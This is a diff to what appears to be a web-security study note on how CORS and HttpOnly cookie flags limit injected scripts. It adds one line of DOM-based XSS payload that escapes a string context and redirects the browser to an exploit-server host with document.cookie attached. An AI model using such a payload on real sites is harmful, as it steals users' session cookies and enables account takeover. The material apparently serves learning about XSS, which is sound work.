@@ -375,3 +375,6 @@ Furthermore, client-side execution security relies on multiple layers working to
 - **Cross-Origin Resource Sharing (CORS)**: Restricting your ability to make asynchronous background data reads across different domains.
     
 - **`HttpOnly` Cookie Flags**: Blocking your script from accessing `document.cookie` even if your code executes perfectly.
+
+
+extra payloads for dom based attacks "};document.location="https://exploit-server.id?c =document.cookie"// if backticks is followed 
